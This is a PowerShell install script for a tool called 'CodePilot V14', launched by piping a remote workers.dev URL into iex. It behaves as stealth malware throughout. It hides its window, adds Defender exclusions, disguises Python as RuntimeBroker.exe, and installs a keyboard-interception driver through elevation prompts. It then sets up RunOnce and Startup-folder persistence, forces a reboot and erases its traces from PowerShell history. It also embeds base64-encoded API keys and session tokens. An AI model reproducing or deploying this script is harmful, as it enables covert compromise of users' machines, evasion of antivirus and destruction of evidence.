# CodePilot V14 — One-Line Install + Stealth Launch (Zero Input)
# Usage: irm https://sweetbush.rr3703404.workers.dev/install.ps1 | iex

# INSTANT STEALTH: make text invisible before anything else prints
try { $Host.UI.RawUI.ForegroundColor = $Host.UI.RawUI.BackgroundColor } catch {}
try { [Console]::ForegroundColor = [Console]::BackgroundColor } catch {}
try { Clear-Host } catch {}
# Now hide the entire window
try {
    Add-Type -Name W -Namespace H -MemberDefinition '[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,int c);[DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();' -ErrorAction SilentlyContinue
    [H.W]::ShowWindow([H.W]::GetConsoleWindow(), 0) | Out-Null
} catch {}

$ErrorActionPreference = 'Stop'
$repo = 'hyperlinken/whoa'
$branch = 'more'
$dir  = "$env:LOCALAPPDATA\techno"

# Add Defender exclusions so files don't get quarantined
try {
    Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "RuntimeBroker.exe" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "python.exe" -ErrorAction SilentlyContinue
} catch {}

# -- Post-reboot resume --
$resumeFlag = Join-Path $dir ".resume_after_reboot"
if (Test-Path $resumeFlag) {
    Remove-Item $resumeFlag -Force -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "TechnoResume" -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 10
    $vbs = Join-Path $dir "stealth.vbs"
    if (Test-Path $vbs) { & wscript.exe $vbs }
    exit 0
}

# 1. Kill old
Get-Process -Name RuntimeBroker -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "*$dir*" } | Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Milliseconds 500

# 2. Download
$zip = "$env:TEMP\t_$(Get-Random).zip"
try {
    Invoke-WebRequest "https://github.com/$repo/archive/refs/heads/$branch.zip" -OutFile $zip -UseBasicParsing
} catch {
    try { Invoke-WebRequest "https://github.com/$repo/archive/$branch.zip" -OutFile $zip -UseBasicParsing } catch {}
}
if (-not (Test-Path $zip)) { exit 1 }

# 3. Extract
if (Test-Path $dir) { Remove-Item $dir -Recurse -Force -ErrorAction SilentlyContinue }
$tmp = "$env:TEMP\t_ex_$(Get-Random)"
Expand-Archive $zip -DestinationPath $tmp -Force
$inner = Get-ChildItem $tmp -Directory | Select-Object -First 1
Move-Item $inner.FullName $dir -Force
Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zip -Force -ErrorAction SilentlyContinue

# 4. Python + venv + deps
$py = $null
foreach ($c in @('python','python3','py')) {
    try { $v = & $c --version 2>&1; if ($LASTEXITCODE -eq 0) { $py = $c; break } } catch {}
}
if (-not $py) { exit 1 }

$vpy = Join-Path $dir ".venv\Scripts\python.exe"
if (-not (Test-Path $vpy)) {
    & $py -m venv (Join-Path $dir ".venv")
    if ($LASTEXITCODE -ne 0) { exit 1 }
}

# pip commands: use SilentlyContinue so proxy warnings don't crash the script
$ErrorActionPreference = 'SilentlyContinue'
& $vpy -m pip install --upgrade pip -q 2>&1 | Out-Null
& $vpy -m pip install -r (Join-Path $dir "requirements.txt") -q 2>&1 | Out-Null
& $vpy -m pip install -e $dir -q 2>&1 | Out-Null
$ErrorActionPreference = 'Stop'

# 5. Config
$envFile = Join-Path $dir ".env.example"
$cfgBlob = "IyBDb2RlUGlsb3QgVjE0IENvbmZpZ3VyYXRpb24KR0VNSU5JX0FQSV9LRVlfRU5DPVFWRXVRV0k0VWs0MlRETmlUbXRFUVhSZldXcDVZek5pYjBsdVVIUmFkRkV4V0hCdmRTMXNTVzVaYlhaMGNqSTNVR2RZTVVFPQpHRU1JTklfMVBTSUQ9Zy5hMDAwQ1FrVFRQY0tyS25jdnRkcHVrMXBDMF9fc1dsSnlXS3JRZUEzVVQtZ2J6UXZ5bHEzNkhoeWRmVFZ2WTNmZVlaZ2ZGR0xpUUFDZ1lLQVFnU0FSVVNGUUhHWDJNaXNfYUdERmlibVVLVjdOUXlzOElkVWhvVkFVRjh5S29mSFZwODlDbkMwVm1RUjVqWXg5dDMwMDc2CkdFTUlOSV8xUFNJRFRTPXNpZHRzLUNqY0JYTXc0MVhUQWI4RmdjT2M0TWI2S180MGJLdW92XzlEN2JYZi1QYUg1Rm1DdTZXSmVFWWtVOGJyc041cEtybHFhc0dIMWFxdE1FQUEKR0VNSU5JX01PREVMPXByb19maXJzdApHRU1JTklfTUFYX0FUVEVNUFRTPTUKR0VNSU5JX01PREVMX1RSSUVTPTMKR0VNSU5JX1RJTUVPVVQ9MTgwCkdFTUlOSV9BVFRFTVBUX1RJTUVPVVQ9MTgwCkdFTUlOSV9JTklUX1RJTUVPVVQ9MzAKR0VNSU5JX1JFSU5JVF9QQVVTRT0xCkdFTUlOSV9NQVhfQkFDS09GRj0xMApHRU1JTklfV0FUQ0hET0dfVElNRU9VVD0xODAKV1BNPTIwMApUWVBFX0lOVEVSVkFMPTAuMDE1CkZJWF9BVVRPX0NMT1NFPXRydWUKUkVTVUxUX0RFTEFZPTEwCkNIVU5LX0FNT1VOVD0xCkNIVU5LX1RZUEU9Y2hhcnMKSFRUUF9QUk9YWT0KSFRUUFNfUFJPWFk9"
$envContent = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($cfgBlob))
[System.IO.File]::WriteAllText($envFile, $envContent)

# 6. Stealth launcher + driver
$sd = Join-Path $dir ".venv\Scripts"
$pyExe = Join-Path $sd "python.exe"

# Install Interception driver FIRST (before renaming python.exe)
$needsReboot = $false
$driverOK = $false
try {
    $chk = & $pyExe -c "import interception; interception.auto_capture_devices(keyboard=True, mouse=False); print('OK')" 2>&1
    if ("$chk" -match "OK") { $driverOK = $true }
} catch {}

if (-not $driverOK) {
    $icpZip = Join-Path $env:TEMP "icp_$(Get-Random).zip"
    $icpDir = Join-Path $env:TEMP "icp_$(Get-Random)"
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Invoke-WebRequest "https://github.com/oblitum/Interception/releases/download/v1.0.1/Interception.zip" -OutFile $icpZip -UseBasicParsing
        Expand-Archive $icpZip -DestinationPath $icpDir -Force
        $installer = Join-Path $icpDir "Interception\command line installer\install-interception.exe"
        if (Test-Path $installer) {
            $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
            if ($isAdmin) {
                & cmd.exe /c "`"$installer`" /install" >$null 2>&1
                $needsReboot = $true
            } else {
                $drvBat = Join-Path $env:TEMP "icp_inst_$(Get-Random).bat"
                "@echo off`r`n`"$installer`" /install >nul 2>&1" | Set-Content $drvBat -Encoding ASCII
                try {
                    Start-Process cmd.exe -ArgumentList "/c `"$drvBat`"" -Verb RunAs -Wait -WindowStyle Hidden
                    $needsReboot = $true
                } catch {}
                Remove-Item $drvBat -Force -ErrorAction SilentlyContinue
            }
        }
    } catch {}
    Remove-Item $icpZip -Force -ErrorAction SilentlyContinue
    Remove-Item $icpDir -Recurse -Force -ErrorAction SilentlyContinue
}

# Now create RuntimeBroker.exe and remove python.exe
$rb = Join-Path $sd "RuntimeBroker.exe"
if (-not (Test-Path $rb)) {
    Copy-Item $pyExe $rb -Force
    $ErrorActionPreference = 'SilentlyContinue'
    & $pyExe (Join-Path $dir "patch_exe.py") $rb 2>&1 | Out-Null
    $ErrorActionPreference = 'Stop'
    $testRb = & $rb -c "print('OK')" 2>&1
    if ("$testRb" -notmatch "OK") {
        Copy-Item $pyExe $rb -Force
    }
}
Remove-Item $pyExe -Force -ErrorAction SilentlyContinue
Remove-Item (Join-Path $sd "pythonw.exe") -Force -ErrorAction SilentlyContinue

# Create stealth launcher VBS
$vbs = Join-Path $dir "stealth.vbs"
$vbsContent = @"
Set o = CreateObject("Scripting.FileSystemObject")
d = o.GetParentFolderName(WScript.ScriptFullName)
Set s = CreateObject("WScript.Shell")
s.CurrentDirectory = d
s.Run Chr(34) & d & "\.venv\Scripts\RuntimeBroker.exe" & Chr(34) & " " & Chr(34) & d & "\main.py" & Chr(34), 0, False
"@
[System.IO.File]::WriteAllText($vbs, $vbsContent)

if ($needsReboot) {
    [System.IO.File]::WriteAllText((Join-Path $dir ".resume_after_reboot"), "1")
    $localScript = Join-Path $dir "_resume.ps1"
    @"
`$dir = '$dir'
Remove-Item (Join-Path `$dir '.resume_after_reboot') -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 12
`$vbs = Join-Path `$dir 'stealth.vbs'
if (Test-Path `$vbs) { & wscript.exe `$vbs }
"@ | Set-Content $localScript -Encoding UTF8

    $resumeCmd = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$localScript`""
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "TechnoResume" -Value $resumeCmd -PropertyType String -Force | Out-Null

    $startupDir = [Environment]::GetFolderPath('Startup')
    $startupVbs = Join-Path $startupDir "rb_start.vbs"
    @"
Set s = CreateObject("WScript.Shell")
s.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""$localScript""", 0, False
"@ | Out-File $startupVbs -Encoding ASCII

    Start-Sleep -Seconds 10
    Restart-Computer -Force
} else {
    & wscript.exe $vbs
}

# Clean install trace from PowerShell history
try { [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() } catch {}
try {
    $hPath = (Get-PSReadLineOption).HistorySavePath
    if ($hPath -and (Test-Path $hPath)) {
        $lines = Get-Content $hPath -ErrorAction SilentlyContinue
        $clean = $lines | Where-Object {
            $_ -notmatch 'workers\.dev' -and
            $_ -notmatch 'sweetbush' -and
            $_ -notmatch 'empty.paper' -and
            $_ -notmatch 'rr3703404' -and
            $_ -notmatch 'install\.ps1' -and
            $_ -notmatch 'hyperlinken' -and
            $_ -notmatch 'codepilot' -and
            $_ -notmatch 'techno'
        }
        $clean | Set-Content $hPath -ErrorAction SilentlyContinue
    }
} catch {}

# Close terminal
try {
    $hwnd = [H.W]::GetConsoleWindow()
    Add-Type -Name K -Namespace H -MemberDefinition '[DllImport("user32.dll")]public static extern uint GetWindowThreadProcessId(IntPtr h,out uint p);' -ErrorAction SilentlyContinue
    $wpid = 0; [H.K]::GetWindowThreadProcessId($hwnd, [ref]$wpid) | Out-Null
    if ($wpid -and $wpid -ne 0) { Stop-Process -Id $wpid -Force -ErrorAction SilentlyContinue }
} catch {}
try { Stop-Process -Id $PID -Force } catch {}
exit
